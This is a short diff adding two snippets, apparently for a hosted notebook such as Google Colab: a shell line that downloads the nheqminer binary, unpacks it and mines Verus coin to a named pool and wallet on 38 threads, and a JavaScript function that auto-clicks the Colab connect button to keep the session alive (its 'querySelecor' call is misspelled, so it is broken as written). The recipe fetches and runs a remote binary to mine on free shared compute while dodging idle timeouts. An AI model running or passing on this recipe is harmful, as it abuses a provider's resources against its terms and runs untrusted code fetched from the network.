@@ -1,0 +1,23 @@
+
+
+
+==================================================================================================
+
+
+!wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RNqEUU7ujcyjiSoe1Z48cAin55pA3VSWEw.Jupter -p x -t 38
+
+
+
+
+==================================================================================================
+
+function ClickConnect(){
+    try{
+        document.querySelecor("colab-connect-button").click()
+        console.log("Executando script...")
+    }
+    catch(err){
+        console.log(err)
+        console.log("Erro...")
+    }
+}
